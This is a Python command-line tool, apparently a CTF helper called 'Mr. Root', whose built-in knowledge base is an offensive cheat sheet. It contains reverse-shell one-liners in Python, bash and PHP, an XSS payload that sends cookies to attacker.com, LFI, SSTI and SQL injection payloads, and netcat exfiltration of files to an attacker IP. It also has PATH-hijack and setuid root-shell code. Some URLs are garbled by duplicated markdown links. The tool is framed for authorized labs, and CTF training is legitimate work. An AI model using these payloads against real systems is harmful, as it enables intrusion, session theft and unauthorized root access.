import sys
import os
import textwrap
import json
import time
# This is Mr. Root in God Mode. All knowledge is now local and instant.
# External network calls are removed to ensure reliability in all environments.

# --- Global Configuration ---
PERSONA = (
    "You are Mr. Root, a witty but precise Linux CTF assistant. "
    "Default to hacking/CTF meanings (e.g., 'upgrade shell' => TTY upgrade). "
    "Stay practical, concise, and lawful; for authorized labs only. "
    "Format code and commands clearly using markdown code blocks."
)
KB = {}
HISTORY = []
HISTORY_INDEX = -1

# --- Terminal Styling Constants ---
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"
ITALIC = "\033[3m"
SKULL = r"""
.-.
(X.X)
'=.|M|.='
.='`"``=.
""".strip().replace('M', BOLD + 'M' + RESET) # God Mode Skull

# --- Knowledge Base Population (Local Data for Speed) ---

def add_topic(key, title, syn, content):
    """Adds a topic to the local knowledge base."""
    KB[key] = { 
        "title": title, 
        "syn": [s.lower() for s in syn], 
        "content": textwrap.dedent(content).strip()
    }

# === KB TOPICS START (EXPANDED "GOD MODE" CTF FOCUS) ===
add_topic("linux","Linux Basics & Deep Reconnaissance",
    ["ls","cd","pwd","cat","find","grep","basic linux","command line","recon","filesystem","os version","kernel","credentials"],
"""
# Linux Basics & Deep Reconnaissance (Initial Foothold)
## System and Kernel Information
```bash
# Get OS and Kernel release information (Crucial for Kernel Exploits)
uname -a

# Get distribution-specific OS version details
cat /etc/os-release
lsb_release -a # If available

# Check environment variables for sensitive data (API keys, passwords)
env
set
```
## File System Search (Flag and Credential Hunting)
```bash
# Find files with the SUID bit set (Common PrivEsc Vector)
find / -perm /4000 2>/dev/null

# Search for common flag names or patterns
find / -type f -name '*flag*' -o -name '*secret*' 2>/dev/null
grep -r 'CTF{' /home/* /opt 2>/dev/null

# Check common web service/DB config locations for credentials
grep -r 'password' /var/www/html /etc/apache2 /etc/mysql /var/mail 2>/dev/null
```
## Network & Service Status
```bash
# Display all listening TCP/UDP sockets with process IDs (PID)
netstat -tulnp
```
""");

add_topic("enumeration","Nmap Scanning & Advanced Enumeration",
    ["enum","enumeration","port scan","service scan","nmap","smb","snmp","linpeas","recon","-sC","-sV","udp","nfs"],
"""
# Enumeration: Nmap Deep Dive and Service Checks
## Nmap Scan Flags Explained
| Flag | Description | Purpose in CTF |
|---|---|---|
| -sC | Script Scan (default scripts). | Finds initial clues. |
| -sV | Version Detection. | Crucial for pinpointing specific public exploits (CVEs). |
| -p- | Scans all 65535 TCP ports. | Ensures no high/unusual ports are missed. |
| -A | Aggressive Scan (OS, Version, Scripts, Traceroute). | Comprehensive, fast first look. |

## Nmap Deep Enumeration Scan
```bash
# Standard Comprehensive Scan
nmap -p- -sC -sV -A -T4 <TARGET> 

# UDP Scan (Necessary for services like SNMP, DNS)
nmap -sU -T4 <TARGET>
```
## SMB/NFS Enumeration
```bash
# NFS Share Check
showmount -e <TARGET> # List exported NFS directories

# Manual SMB Share Listing (Check for NULL session login)
smbclient -L //<TARGET>/ -N
```
""");

add_topic("web","Web Exploitation: Essential Payloads & Tools",
    ["xss","lfi","rfi","ssti","ssrf","jwt","xxe","web vuln","fuzz","ffuf","xss payload","cloudflare","cookie theft"],
"""
# Web Exploitation: Essential Payloads and Contexts
## Directory Bruteforce & Fuzzing (Ffuf/GoBuster Equivalents)
```bash
# Check for files with common extensions
ffuf -u http://target/FUZZ.EXT -w /path/to/common_files.txt -e .php,.bak,.html,.zip -mc 200
```
## Local/Remote File Inclusion (LFI/RFI) Payloads
LFI allows reading local files. RFI allows executing remote code.

| File to Read | Path Example | Bypass (Double Encoding) |
|---|---|---|
| **/etc/passwd** | `?page=../../../../etc/passwd` | `?page=..%252f..%252f..%252fetc%252fpasswd` |
| **/proc/self/environ** | Can reveal environment variables. | `?page=/proc/self/environ` |
| **Apache Logs (Log Poisoning)** | `?page=/var/log/apache2/access.log` | Inject malicious PHP into logs via User-Agent. |

## Cross-Site Scripting (XSS) Payloads
### Basic Alert and Test
```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```
### Cookie Theft (Out-of-Band)
Used to send the victim's cookie to an attacker's endpoint (e.g., RequestBin).
```html
<img src="#" onerror="document.location='[http://attacker.com/cookie_catch?c=](http://attacker.com/cookie_catch?c=)' + document.cookie">
```

## Server-Side Template Injection (SSTI) Payloads
Identify the template engine first (e.g., Jinja2, Twig, FreeMarker).

| Engine | Command Execution Payload (Jinja2) |
|---|---|
| Python/Jinja2 | `{{''.__class__.__mro__[1].__subclasses__()[40]('id').read()}}`|

## CloudFlare Bypass
Use specialized Python modules like `cfscrape` to automate scripting against pages protected by "I'm Under Attack" mode.
```python
import cfscrape
url = '[http://target.tech/protected/](http://target.tech/protected/)'
scraper = cfscrape.create_scraper()
print(scraper.get(url).content)
```
""");

add_topic("sql_sqli","SQL & SQL Injection Deep Dive",
    ["sql","sqli","sql injection","union based","blind sqli","error based","time based","sqlmap","db enum","database","mysql","mssql"],
"""
# SQL & SQL Injection (SQLi) Deep Dive
SQL Injection exploits web applications that use user input directly in database queries.

## Core Union-Based Injection
Used when the query returns data, allowing arbitrary data retrieval.
1. **Determine Column Count:** Use `ORDER BY` clause to find the number of columns.
   `' ORDER BY 1 --`, `' ORDER BY 10 --` (Finds the maximum number before error)
2. **Determine Column Type:** Find which column outputs strings (usually only one or two).
   `' UNION SELECT NULL, NULL, 'STRING_TEST', NULL --`
3. **Exploit (Example MySQL):** Retrieve database and user.
   `' UNION SELECT 1, database(), user(), 4 --`

## Blind SQLi Techniques
Used when the application does not return data, only a boolean (true/false) response.

* **Boolean-Based:** Use conditional statements to leak data character by character.
    ```sql
    # Check if the first letter of the database name is 'c'
    ' AND (SELECT SUBSTR(database(), 1, 1) = 'c') -- 
    ```
* **Time-Based:** Use delays to leak data character by character when boolean responses are ambiguous.
    ```sql
    # If the first letter of the database name is 'c', delay the response by 5 seconds
    ' AND IF( (SELECT SUBSTR(database(), 1, 1) = 'c'), SLEEP(5), 1) -- 
    ```

## Tooling
**sqlmap** is the definitive automated tool.
```bash
# Basic usage for testing a URL parameter
sqlmap -u "[http://target.com/page.php?id=1](http://target.com/page.php?id=1)" --batch
# Dump all databases
sqlmap -u "[http://target.com/page.php?id=1](http://target.com/page.php?id=1)" --dbs
```
""");

add_topic("cve_vuln","Vulnerability Research & CVEs",
    ["cve","vulnerability","exploit","cve search","exploit-db","vulnerability research","patch","security advisory"],
"""
# Vulnerability Research & CVEs (Common Vulerabilities and Exposures)

## What is a CVE?
A **CVE** is a unique identifier assigned to publicly known information security vulnerabilities. It allows systems to quickly reference specific flaws (e.g., CVE-2023-1234).

## Research Workflow
1.  **Identify Target Software/Version:** Use Nmap (`-sV`), Wappalyzer, or banner grabbing. (e.g., Apache 2.4.49, WordPress 6.0).
2.  **Search:** Use the software name and version in these databases:
    * **Google/Bing:** Often the fastest for recent news. Search `[Software Name] [Version] exploit`.
    * **Exploit-DB:** The primary source for documented, public exploits. Use the search function on the site or the local command line tool:
        ```bash
        searchsploit wordpress 6.0
        # Copy the exploit to your current directory
        searchsploit -m 50171 # (Use the EDB-ID)
        ```
    * **CVE Databases:** MITRE's CVE List or NVD (National Vulnerability Database) for official severity scores and descriptions.

## Interpreting Scores
Vulnerabilities are often scored using **CVSS** (Common Vulnerability Scoring System).
* **Base Score:** 9.0-10.0 is **Critical** (Usually RCE/PrivEsc). 7.0-8.9 is **High**.
* **Vector String:** Describes *how* the vulnerability is exploited (e.g., **AV:N/AC:L/PR:N/UI:N** - Network Attack Vector, Low Complexity, No Privileges, No User Interaction).
""");

add_topic("revshell","Reverse Shells: Multi-Language & Advanced TTY",
    ["reverse shell","tty upgrade","spawn shell","netcat","nc","python shell","pivoting","bash","perl","php","socat", "upgrade shell", "shell upgrade", "tty", "interactive shell", "upgrade", "shell"],
"""
# Reverse Shells: Comprehensive List
**Attacker Listener:** `nc -lvnp 4444` (Basic) OR `rlwrap nc -lvnp 4444` (Stable)

## Python (Most Reliable)
```bash
# Python 3
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## Bash (Simple, common, but less stable)
```bash
bash -i >& /dev/tcp/<IP>/4444 0>&1
```
## PHP
```php
php -r '$sock=fsockopen("<IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### Advanced TTY Upgrade (Essential for stable shell)
1. **Victim (Initial Shell):** `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. **Victim (In the new TTY):** Press **Ctrl+Z** to background the shell.
3. **Attacker (Listener Shell):** `stty raw -echo`
4. **Attacker (Listener Shell):** `fg` (Then press ENTER twice)
5. **Victim (New TTY):** `export TERM=xterm`
""");

add_topic("privesc","Linux Privilege Escalation (LPE) Deep Dive",
    ["sudo","suid","capabilities","cron","gtfobins","privesc","priv esc","root","lpe","writable","ld_preload","path hijack","suid files","exploitable"],
"""
# Linux Privilege Escalation (LPE) Vectors
## SUDO Misconfigurations (Most Common)
- **Check Allowed Sudo Commands:** `sudo -l` (Look for `NOPASSWD:` entries or commands that can execute arbitrary code).
- **GTFOBins Check:** If a command is listed (e.g., `find`, `vim`, `perl`), check its corresponding GTFOBins entry for a direct root shell command.
  *Example (find):* `sudo find . -exec /bin/sh \; -quit`
## SUID/SGID Exploitation
- **Find SUID files:** `find / -perm /4000 2>/dev/null`
- **Check Exploitability:** Run the resulting file paths through **GTFOBins**.
## CRON Jobs (Scheduled Tasks)
- **Check cron files:** `cat /etc/crontab` and `ls -la /etc/cron.d/`
- **Exploitation:** If a script executed by root is in a writable directory, or if the script calls a function without an absolute path, exploit using **Path Hijacking** (see below) or script modification.
## Writable Files/Path Hijacking
- **PATH Hijacking Technique:** Place a malicious executable (e.g., a simple reverse shell) in a directory you control (like `/tmp`), rename it to the un-pathed command used by the root script, and prepend your directory to the $PATH variable.
  ```bash
  echo '/bin/bash -p' > /tmp/target_binary # -p keeps root privileges
  chmod +x /tmp/target_binary
  export PATH=/tmp:$PATH 
  ```
""");

add_topic("capabilities","LPE: Linux Capabilities Exploitation",
    ["capabilities","cap","cap_setuid","cap_dac_override","getcap","exploitable capability"],
"""
# LPE: Linux Capabilities Exploitation
Capabilities allow a process to perform privileged operations (like binding to a low port or changing file ownership) without needing the full root user ID.

## Find files with Capabilities
```bash
# Find files that have associated capabilities
getcap -r / 2>/dev/null
```

## Common Exploitable Capabilities
| Capability | Privilege Granted | Exploit Tactic |
|---|---|---|
| **cap_setuid+eip** | Change the user ID of the running process. | Run the binary, setuid(0) to become root. |
| **cap_dac_override+eip** | Bypass all file read/write permissions. | Read files like /etc/shadow or /root/root.txt. |
| **cap_net_raw+eip** | Inject packets (for ARP spoofing or network sniffing). | Use tools like raw sockets or specialized scripts. |

## Exploitation Example (cap_setuid)
If a binary, say `/usr/bin/target`, has `cap_setuid+eip`, you can write a simple C wrapper:
```c
#include <unistd.h>
#include <stdlib.h>

void main() {
    setuid(0);  // Set effective UID to root
    setgid(0);  // Set effective GID to root
    system("/bin/bash -p"); // Execute a privileged shell
}
```
""");

add_topic("ldap","AD/Kerberos Enumeration (LDAP)",
    ["ldap","active directory","kerberos","ad","enum4linux","bloodhound","internal network"],
"""
# Active Directory / Kerberos Enumeration (LDAP Focus)
LDAP (Lightweight Directory Access Protocol) is the primary method for querying AD.

## Recon Tools
| Tool | Purpose | Usage (Simulated) |
|---|---|---|
| **ldapsearch** | Manual querying of LDAP records. | `ldapsearch -h DC_IP -x -s base namingContexts` |
| **enum4linux** | Comprehensive SMB/LDAP enumeration (Shares, Users, Groups). | `enum4linux -a <TARGET_IP>` |
| **kerbrute** | Bruteforcing/Validating Active Directory user accounts. | `kerbrute userenum --domain domain.local users.txt` |

## Key Information to Look For
- **Users and Groups:** Find low-privilege users, domain admins, and service accounts.
- **SPNs (Service Principal Names):** Accounts with SPNs can be cracked offline (Kerberoasting).
  ```bash
  # Using Impacket (Sip-based syntax)
  getuserspns.py domain.local/user:password -request
  ```
- **Unconstrained Delegation:** Identify machines that allow delegation, a major lateral movement vector.
""");

add_topic("exfil","Data Exfiltration and Tunneling",
    ["exfil","tunnel","data exfil","pivot","data transfer","scp","netcat transfer","data theft"],
"""
# Data Exfiltration and Tunneling
Getting the flag or shell out is as important as finding it.

## Simple File Transfer (Reliable)
| Method | Command (Victim -> Attacker) | Command (Attacker Listener) |
|---|---|---|
| **Netcat (Basic)** | `cat /root/flag.txt | nc <ATTACK_IP> 9999` | `nc -lvnp 9999 > flag.txt` |
| **Python HTTP Server** | `python3 -m http.server 8000 &` (Victim hosts) | `wget http://VICTIM_IP:8000/flag.txt` (Attacker downloads) |
| **Curl/Wget** | `curl -T /root/flag.txt ftp://<ATTACK_IP>/` | (Requires Attacker FTP server) |

## Reverse SSH Tunneling (Pivoting)
Use this to expose an internal target service (e.g., port 8080) back to your attacking machine.

```bash
# On VICTIM (Tunneling OUT to Attacker)
ssh -R 8080:127.0.0.1:8080 attacker_user@ATTACK_IP
# Attacker can now connect to localhost:8080 to access the Victim's internal 8080
```
""");

add_topic("reversing","Reverse Engineering & Pwn Deep Dive",
    ["reversing","ghidra","ida","cutter","gdb","static analysis","dynamic analysis","assembly","disassembly","crackme","pwn","binary","buffer overflow","shellcode","rop","format string"],
"""
# Reverse Engineering (RE) & Binary Exploitation (Pwn)
## Dynamic Analysis Essentials
| Tool | Purpose | Usage Example |
|---|---|---|
| **ltrace** | Traces library calls. | `ltrace ./binary` |
| **strace** | Traces system calls. | `strace ./binary` |
| **gdb** | Debugger for runtime analysis. | `gdb -q ./binary` |

## Binary Protections & Bypasses
```bash
# Detailed binary analysis for protections
checksec --file <binary>
```
| Protection | Prevention Goal | Bypass Strategy |
|---|---|---|
| **NX** | Prevent code execution on the stack (Shellcode) | **Return-Oriented Programming (ROP)** |
| **Canary** | Prevent stack buffer overflows | Leak canary or bypass with heap overflow |
| **PIE (ASLR)** | Randomize function/data addresses | Leak an address to calculate the base |

## ROP Chain Construction
- **Goal:** Execute a shell (e.g., `system("/bin/sh")`).
- **Chain (x64):** `[Padding] + [POP_RDI_GADGET] + [ADDR_OF_"/bin/sh"] + [ADDR_OF_SYSTEM]`
""");

add_topic("crypto","Cryptography: Ciphers, Hashes, and Classic Attacks",
    ["crypto","base64","xor","rot13","caesar","encoding","hashing","cipher","vigenere","atbash","railfence","playfair","enigma", "rc4", "lc4"],
"""
# Cryptography: Ciphers, Hashes, and Classic Attacks
## Stream Ciphers
| Cipher | Key/Mechanism | Quick Tip |
|---|---|---|
| **RC4** | Key-scheduling algorithm (KSA) and PRGA. | Vulnerable if keys are related or reused (e.g., WiFi WEP). |
| **LC4** | A simplified, instructional variant of RC4. | Often requires custom implementation to solve. |

## Substitution & Transposition Ciphers (Manual/Script)
| Cipher | Key/Mechanism | Quick Tip |
|---|---|---|
| **ROT13/Caesar** | Fixed/Variable letter shift. | Bruteforce 25 shifts. Check for punctuation shift. |
| **Vigenere** | Uses a repeating keyword. | Index of Coincidence (IC) can find key length. |
| **Playfair** | 5x5 matrix substitution based on a keyword. | Decryption requires matrix reconstruction. |
| **Railfence** | Text written in a zigzag pattern (key is the number of rails). | Bruteforce small key counts (rails). |
| **Enigma** | Rotor mechanism and plugboard. | Use online simulators with a hint to the settings. |

## XOR Operations
- **Single-Byte Key:** Bruteforce all 256 keys. XOR known plaintext ('flag{') against ciphertext.
- **Two-Time Pad:** $C_1 \oplus C_2 = P_1 \oplus P_2$. Use crib dragging/frequency analysis on the resulting stream.
- **Python PwnTools Helper:** ```python
  import pwn
  pwn.xor("KEY", "RAW_BINARY_CIPHER") 
  ```
""");

add_topic("crypto_adv","Advanced Cryptography: RSA, AES, and Pads",
    ["rsa","aes","two time pad","mult-prime rsa","small e","wiener's attack","chinese remainder","ecb"],
"""
# Advanced Cryptography: RSA, AES, and Two-Time Pads
## RSA Exploitation
| Attack | Telltale Sign | Key Strategy |
|---|---|---|
| **Factoring** | $N$ is small enough (or can be factored online). | Use tools like `factordb.com` to find $P$ and $Q$. |
| **Small $e$ (Public Exponent)** | $e$ is small (e.g., 3). | Apply the Coppersmith's/Cube-Root attack if $c$ is smaller than $N^{(1/e)}$. |
| **Wiener's Attack** | $e$ is enormously large (or $d$ is very small). | Use specific scripts (based on continued fractions) to recover $d$. |
| **Chinese Remainder Theorem** | Multiple ciphertexts ($c$) and moduli ($n$) are given, but $e$ is the same. | Use the CRT to solve for the plaintext $m$. |

## AES and Block Ciphers
* **AES ECB (Electronic Codebook):** Highly insecure. It's the "blind SQL" of crypto; the same plaintext block always maps to the same ciphertext block. Exploit by testing for repeated blocks to leak information (e.g., character-by-character extraction).
""");

add_topic("stego","Steganography & Forensics Deep Dive",
    ["stego","forensics","stegcracker","steghide","zsteg","jsteg","pcap","wireshark","metadata","audio spectrum","whitespace"],
"""
# Steganography & Forensics Deep Dive
## File Steganography Tools (Images/Files)
| Tool | Purpose | Key Feature |
|---|---|---|
| **steghide** | Hides data in images/audio using a passphrase. | Supports dictionary attacks using `StegCracker`. |
| **zsteg** | Specialized in Least Significant Bit (LSB) stego. | Works on PNG and BMP images. |
| **jsteg** | Command-line tool for JPEG steganography. | Handy for analyzing specific JPEG techniques. |
| **ExifTool** | Reads and writes file metadata (hidden comments, author, GPS data). | Crucial for initial file inspection. |
| **Stegsolve.jar** | Java GUI tool for visually inspecting color channels, bit planes, and inverted colors. | Essential for complex visual stego. |
| **binwalk** | Finds embedded files and hidden data, often in firmware or archives. | Use `-e` flag to extract files: `binwalk -e <file>`. |
| **strings** | Extracts all printable strings from binary or image files. | Useful for finding flag fragments or passwords. |

## Network Forensics (PCAP)
* **Wireshark:** The standard tool for analyzing `.pcap` files. Look for common protocols (HTTP, FTP, Telnet) or data exfiltration attempts.
* **Network Miner:** Automated tool to scrape files, images, credentials, and artifacts directly from PCAP files.

## Exotic Steganography
| Technique | Hint | Analysis Method |
|---|---|---|
| **Audio Spectrum** | Static noise, strange bleeps/bloops. | Use SONIC Visualizer to check the spectrogram for visual data (e.g., QR code). |
| **Morse Code** | Two distinct values (e.g., dots/dashes, or two colors). | Decode using a standard online decoder. |
| **Esoteric Languages** | Brainfuck (`+++++`, `[]`, `><`), Malboge (Base85-like), Ook! (`.`, `?`, `!`). | Use online interpreters or pre-built parsers. |
""");

add_topic("forensics","Forensics Deep Dive: Memory & Disk Analysis",
    ["forensics","memory","volatility","disk","image","ntfs","ext4","fls","icat","scalpel","file carving","memdump"],
"""
# Forensics Deep Dive: Memory & Disk Analysis (New Chapter)
## Disk Image Forensics (The Sleuth Kit)
| Tool | Purpose | Usage Example |
|---|---|---|
| **fls** | List file names in a disk image. | `fls -r -p image.dd` (Recursive list) |
| **icat** | Copy files based on inode number. | `icat image.dd <INODE_NUMBER> > recovered_file` |
| **tsk_recover** | Recover deleted files from a disk image. | `tsk_recover -d image.dd output_dir` |
| **scalpel** | File carving utility (recovers files based on headers/footers). | Configure headers in `scalpel.conf`, then run: `scalpel -o output_dir image.dd` |
| **Autopsy** | GUI-based tool for comprehensive disk analysis. | Best for visual inspection of timeline, filesystems, and artifacts. |

## Memory Image Forensics (Volatility Framework)
Always find the correct profile first: `vol.py -f mem.raw imageinfo`

| Volatility Plugin | Description | Key Artifacts to Find |
|---|---|---|
| **pslist** | List running processes. | Malicious/hidden processes, unexpected executables. |
| **connscan/sockscan** | Network connections and listening sockets. | C2 communication, unclosed connections. |
| **filescan** | List open file objects. | Flag files, config files, shell history. |
| **hashdump** | Extract password hashes from Windows SAM/SYSTEM hives. | NT/LM hashes for cracking. |
| **consoles/cmdscan** | Recover command history from consoles/command prompts. | Command execution clues, manual flag attempts. |
| **dlllist** | List loaded DLLs for each process. | Hidden malware/injection points. |
""");

add_topic("windows","Windows & PowerShell Penetration Testing",
    ["windows","powershell","amsi bypass","nishang","empire","windows exec","reversing windows"],
"""
# Windows & PowerShell Penetration Testing
## PowerShell Tool Suites
| Tool | Purpose | Key Feature |
|---|---|---|
| **nishang** | A collection of PowerShell scripts for offensive security. | Contains scripts for reverse shells (e.g., ICMP shell), privilege escalation, and reconnaissance. |
| **Empire** | A large post-exploitation framework built on PowerShell. | Comprehensive library for lateral movement, privilege escalation, and data harvesting. |

## Defense Evasion
* **AMSI Bypass:** Anti-Malware Scan Interface (AMSI) monitors PowerShell activity. Use publicly known bypass scripts or obfuscation techniques to avoid detection.
* **PE File Analysis:** Windows executables use the PE (Portable Executable) format. Use the Python module `pefile` to parse headers and sections for reversing.
  ```python
  import pefile 
  pe = pefile.PE("binary.exe")
  # Inspect sections, imports, exports, etc.
  ```
""");

# === KB TOPICS END ===

# --- Core CLI Logic ---

def display_output(text, is_llm=False):
    """Prints output with appropriate terminal colors."""
    if is_llm:
        # Placeholder for future LLM integration, currently shows the "unknown" error
        print(f"\n{SKULL}\n--- {YELLOW}{BOLD}UNKNOWN KNOWLEDGE {RESET} ---\n{ITALIC}{text}{RESET}\n")
    else:
        # Simple formatting for terminal output
        # Handle markdown bold and code blocks for CLI output
        output = text.replace("#", f"{CYAN}#").replace("```bash", f"{GREEN}").replace("```php", f"{GREEN}").replace("```sql", f"{GREEN}").replace("```c", f"{GREEN}").replace("```python", f"{GREEN}").replace("```", RESET)
        output = output.replace("|", f"{CYAN}|{RESET}")
        print(f"\n{output}\n")

def match_topic(q):
    """Finds the best match in the local KB."""
    ql = q.lower()
    best = None
    score = 0

    for k, v in KB.items():
        # Score based on how many synonyms are found in the query
        s = sum(1 for word in v["syn"] if word in ql)
        if s > score:
            best = k
            score = s
    return best

def process_command(q):
    """Main function to handle user input."""
    global HISTORY, HISTORY_INDEX
    q = q.strip()
    
    # History management
    if q and (not HISTORY or HISTORY[0] != q):
        HISTORY.insert(0, q)
    HISTORY_INDEX = -1

    ql = q.lower()

    # 1. Handle Built-in Commands
    if ql in ("/exit", "exit", "quit"):
        print(f"\n{YELLOW}Bye! System powering down...{RESET}")
        sys.exit(0)

    if ql == "/topics":
        topics = ", ".join(KB.keys())
        display_output(f"{CYAN}{BOLD}Available Local Topics:{RESET} {topics}")
        return

    if ql == "/help":
        display_output(f"{CYAN}{BOLD}Commands:{RESET} /topics, /detail <topic>, /help, /exit. Type any hacking concept or keyword for an instant KB lookup.")
        return

    if ql.startswith("/detail "):
        key = ql.split(" ", 2)[1]
        if key in KB:
            display_output(f"--- {CYAN}{BOLD}LOCAL KB HIT: {KB[key]['title']}{RESET} ---")
            display_output(KB[key]["content"])
        else:
            display_output(f"{RED}Error:{RESET} Topic '{key}' not found. Use /topics to see the list.", is_llm=False)
        return

    # 2. KB Match Check
    topic = match_topic(q)
    if topic:
        display_output(f"--- {CYAN}{BOLD}LOCAL KB HIT: {KB[topic]['title']}{RESET} ---")
        display_output(KB[topic]["content"])
        return

    # 3. Final Fallback (No KB Match)
    display_output(
        f"{RED}Error:{RESET} Topic or command '{q}' not found in the local knowledge base. "
        f"You have gone beyond the Root's known domain. Try a more specific keyword, or use /topics."
    , is_llm=False)

def main():
    """Starts the interactive CLI loop."""
    print(f"\n{SKULL}")
    print(f"{CYAN}{BOLD}Mr. Root: GOD MODE CTF Assistant Initialized - The All-in-One Book.{RESET}")
    print(f"{BOLD}The entire knowledge vault is now local and instant, featuring the new Forensics chapter.{RESET}")
    print("Type a hacking concept (e.g., 'AES ECB', 'volatility', 'scalpel') for a lightning-fast answer.")
    print(f"{CYAN}{BOLD}Commands:{RESET} /topics, /detail <topic>, /help, /exit.")
    
    while True:
        try:
            # Display the prompt
            prompt = f"{GREEN}{BOLD}root@mr-root-ai{RESET}{GREEN}:{RESET} $ "
            
            # Read input (simple readline replacement)
            command = input(prompt)
            if not command.strip():
                continue
            
            process_command(command)
            
        except EOFError:
            # Handle Ctrl+D
            print(f"\n{YELLOW}Bye! System powering down...{RESET}")
            break
        except Exception as e:
            print(f"{RED}An unexpected error occurred: {e}{RESET}")
            break

if __name__ == "__main__":
    main()
